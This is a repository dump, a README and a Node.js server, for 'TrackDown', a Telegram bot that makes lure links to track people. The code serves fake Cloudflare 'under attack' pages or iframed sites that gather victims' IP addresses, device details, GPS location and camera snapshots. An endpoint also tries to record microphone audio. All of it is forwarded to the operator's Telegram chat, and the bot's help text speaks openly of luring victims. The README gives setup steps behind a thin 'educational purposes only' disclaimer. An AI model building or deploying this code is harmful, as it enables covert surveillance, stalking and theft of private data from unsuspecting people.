{"file_contents":{"README.md":{"content":"\n<p align='center'><img style=\"height:100px;width:100px\" src=\"icon.png\" ></p>\n\n\n<h2 align='center'>Track Down people by just using a link.</h2>\n\n<div align=\"center\">\n\n</div>\n\nThis tool is based upon [Psi](https://github.com/Th30neAnd0nly/Psi) .This is a telegram implementation with extra features than Psi.\n\n\n[![Run on Repl.it](https://replit.com/@anshuraj152010/TrackDown-2?v=1)\n \n#### Video Tutorial \n\n[![Video Tutorial](https://github.com/Th30neAnd0nly/TrackDown/blob/main/vid.png)](https://github.com/Th30neAnd0nly/TrackDown/blob/main/vid.mp4?raw=true)\n\n**Make sure you put `bot` as the secret's key , it's case sensitive.**\n\n\n### How to build\n1. Create a telegram bot through [BotFather](https://t.me/BotFather).\n1. Copy it's API key\n1. Clone the repo\n1. `cd TrackDown`\n1. Create a environment variable in `.env` file named `bot` and put your telegram bot token as it's value.\n1. Replace your website URL\n1. Run `npm install`\n1. Afterwards `npm start`\n1. Your Bot is now online.\n\n\n\n## DISCLAIMER\n<p align=\"center\">\n TO BE USED FOR EDUCATIONAL PURPOSES ONLY\n\n</p>\n\nCREATED WITH ðŸ«¶\n\nThe use of the PSI is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).\n\n","size_bytes":1289},"index.js":{"content":"require('dotenv').config();\nconst fs = require(\"fs\");\nconst express = require(\"express\");\nvar cors = require('cors');\nvar bodyParser = require('body-parser');\nconst fetch = require('node-fetch');\nconst TelegramBot = require('node-telegram-bot-api');\nconst mic = require('mic'); // Added for audio recording\nconst bot = new TelegramBot(process.env[\"bot\"], { polling: true });\nvar jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });\nvar urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });\nconst app = express();\napp.use(jsonParser);\napp.use(urlencodedParser);\napp.use(cors());\napp.set(\"view engine\", \"ejs\");\n\n// Modify your URL here\nvar hostURL = \"https://486db621-cd22-45e1-bc48-c422fa257026-00-2kqe71mb2qv2o.pike.replit.dev/\";\n// TOGGLE for Shorters\nvar use1pt = false;\n\napp.get(\"/w/:path/:uri\", (req, res) => {\n    var ip;\n    var d = new Date();\n    d = d.toJSON().slice(0, 19).replace('T', ':');\n    if (req.headers['x-forwarded-for']) {\n        ip = req.headers['x-forwarded-for'].split(\",\")[0];\n    } else if (req.connection && req.connection.remoteAddress) {\n        ip = req.connection.remoteAddress;\n    } else {\n        ip = req.ip;\n    }\n\n    if (req.params.path != null) {\n        res.render(\"webview\", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });\n    } else {\n        res.redirect(\"https://t.me/alexescrowteam\");\n    }\n});\n\napp.get(\"/c/:path/:uri\", (req, res) => {\n    var ip;\n    var d = new Date();\n    d = d.toJSON().slice(0, 19).replace('T', ':');\n    if (req.headers['x-forwarded-for']) {\n        ip = req.headers['x-forwarded-for'].split(\",\")[0];\n    } else if (req.connection && req.connection.remoteAddress) {\n        ip = req.connection.remoteAddress;\n    } else {\n        ip = req.ip;\n    }\n\n    if (req.params.path != null) {\n        res.render(\"cloudflare\", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });\n    } else {\n        res.redirect(\"https://t.me/alexescrowteam\");\n    }\n});\n\n// New endpoint for recording and sending audio\napp.post(\"/recordAudio\", (req, res) => {\n    const uid = decodeURIComponent(req.body.uid) || null;\n    if (!uid) {\n        return res.status(400).send(\"UID is required\");\n    }\n\n    // Configure the microphone\n    const micInstance = mic({\n        rate: '16000',\n        channels: '1',\n        debug: false,\n        exitOnSilence: 6,\n        fileType: 'wav'\n    });\n\n    const micInputStream = micInstance.getAudioStream();\n    const outputFileStream = fs.createWriteStream(`audio_${Date.now()}.wav`);\n\n    micInputStream.pipe(outputFileStream);\n\n    // Start recording\n    micInstance.start();\n\n    // Stop recording after 2 seconds\n    setTimeout(() => {\n        micInstance.stop();\n        console.log(\"Recording stopped\");\n\n        // Read the recorded file and send it via Telegram\n        fs.readFile(outputFileStream.path, (err, data) => {\n            if (err) {\n                console.error(\"Error reading audio file:\", err);\n                return res.status(500).send(\"Error processing audio\");\n            }\n\n            // Send the audio file via Telegram\n            bot.sendAudio(parseInt(uid, 36), data, {\n                filename: \"audio_recording.wav\",\n                contentType: 'audio/wav'\n            }).then(() => {\n                // Delete the file after sending\n                fs.unlink(outputFileStream.path, (err) => {\n                    if (err) console.error(\"Error deleting audio file:\", err);\n                });\n                res.send(\"Audio recorded and sent successfully\");\n            }).catch((error) => {\n                console.error(\"Error sending audio:\", error);\n                res.status(500).send(\"Error sending audio\");\n            });\n        });\n    }, 2000); // 2 seconds\n});\n\nbot.on('message', async (msg) => {\n    const chatId = msg.chat.id;\n\n    if (msg?.reply_to_message?.text == \"ðŸŒ Enter Your URL\") {\n        createLink(chatId, msg.text);\n    }\n\n    if (msg.text == \"/start\") {\n        var m = {\n            reply_markup: JSON.stringify({ \"inline_keyboard\": [[{ text: \"Create Link\", callback_data: \"crenew\" }]] })\n        };\n\n        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \\nYou can use this bot to track down people just through a simple link.\\nIt can gather informations like location , device info, camera snaps.\\n\\nType /help for more info.`, m);\n    }\n    else if (msg.text == \"/create\") {\n        createNew(chatId);\n    }\n    else if (msg.text == \"/help\") {\n        bot.sendMessage(chatId, `Through this bot you can track people just by sending a simple link.\\n\\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\\nAfter receiving the url it will send you 2 links which you can use to track people.\\n\\nSpecifications.\\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.\\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.\\n( âš ï¸ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )\\n\\nOWNER AND CREATED BY:-@anshu_rajput_880`);\n    }\n});\n\nbot.on('callback_query', async function onCallbackQuery(callbackQuery) {\n    bot.answerCallbackQuery(callbackQuery.id);\n    if (callbackQuery.data == \"crenew\") {\n        createNew(callbackQuery.message.chat.id);\n    }\n});\n\nbot.on('polling_error', (error) => {\n    console.log(error.code);\n});\n\nasync function createLink(cid, msg) {\n    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);\n\n    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {\n        var url = cid.toString(36) + '/' + btoa(msg);\n        var m = {\n            reply_markup: JSON.stringify({\n                \"inline_keyboard\": [[{ text: \"Create new Link\", callback_data: \"crenew\" }]]\n            })\n        };\n\n        var cUrl = `${hostURL}/c/${url}`;\n        var wUrl = `${hostURL}/w/${url}`;\n\n        bot.sendChatAction(cid, \"typing\");\n        if (use1pt) {\n            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());\n            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());\n\n            var f = \"\", g = \"\";\n\n            for (var c in x) {\n                f += x[c] + \"\\n\";\n            }\n\n            for (var c in y) {\n                g += y[c] + \"\\n\";\n            }\n\n            bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\\nURL: ${msg}\\n\\nâœ…Your Links\\n\\nðŸŒ CloudFlare Page Link\\n${f}\\n\\nðŸŒ WebView Page Link\\n${g}`, m);\n        }\n        else {\n            bot.sendMessage(cid, `New links has been created successfully.\\nURL: ${msg}\\n\\nâœ…Your Links\\n\\nðŸŒ CloudFlare Page Link\\n${cUrl}\\n\\nðŸŒ WebView Page Link\\n${wUrl}`, m);\n        }\n    }\n    else {\n        bot.sendMessage(cid, `âš ï¸ Please Enter a valid URL , including http or https.`);\n        createNew(cid);\n    }\n}\n\nfunction createNew(cid) {\n    var mk = {\n        reply_markup: JSON.stringify({ \"force_reply\": true })\n    };\n    bot.sendMessage(cid, `ðŸŒ Enter Your URL`, mk);\n}\n\napp.get(\"/\", (req, res) => {\n    var ip;\n    if (req.headers['x-forwarded-for']) {\n        ip = req.headers['x-forwarded-for'].split(\",\")[0];\n    } else if (req.connection && req.connection.remoteAddress) {\n        ip = req.connection.remoteAddress;\n    } else {\n        ip = req.ip;\n    }\n    res.json({ \"ip\": ip });\n});\n\napp.post(\"/location\", (req, res) => {\n    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;\n    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;\n    var uid = decodeURIComponent(req.body.uid) || null;\n    var acc = decodeURIComponent(req.body.acc) || null;\n    if (lon != null && lat != null && uid != null && acc != null) {\n        bot.sendLocation(parseInt(uid, 36), lat, lon);\n        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\\nLongitude: ${lon}\\nAccuracy: ${acc} meters`);\n        res.send(\"Done\");\n    }\n});\n\napp.post(\"/\", (req, res) => {\n    var uid = decodeURIComponent(req.body.uid) || null;\n    var data = decodeURIComponent(req.body.data) || null;\n    var ip;\n    if (req.headers['x-forwarded-for']) {\n        ip = req.headers['x-forwarded-for'].split(\",\")[0];\n    } else if (req.connection && req.connection.remoteAddress) {\n        ip = req.connection.remoteAddress;\n    } else {\n        ip = req.ip;\n    }\n\n    if (uid != null && data != null) {\n        if (data.indexOf(ip) < 0) {\n            return res.send(\"ok\");\n        }\n\n        data = data.replaceAll(\"<br>\", \"\\n\");\n        data += \"\\n\\nðŸ‘¨â€ðŸ’» OWNER AND CREATED BY:-@alexescrowteam\";\n\n        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: \"HTML\" });\n        res.send(\"Done\");\n    }\n});\n\napp.post(\"/camsnap\", (req, res) => {\n    var uid = decodeURIComponent(req.body.uid) || null;\n    var img = decodeURIComponent(req.body.img) || null;\n\n    if (uid != null && img != null) {\n        var buffer = Buffer.from(img, 'base64');\n        var info = {\n            filename: \"camsnap.png\",\n            contentType: 'image/png'\n        };\n\n        try {\n            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);\n        } catch (error) {\n            console.log(error);\n        }\n\n        res.send(\"Done\");\n    }\n});\n\napp.listen(5000, () => {\n    console.log(\"App Running on Port 5000!\");\n    console.log(\"Created by Anshu(Alex)\");\n});\n","size_bytes":9733}},"version":2}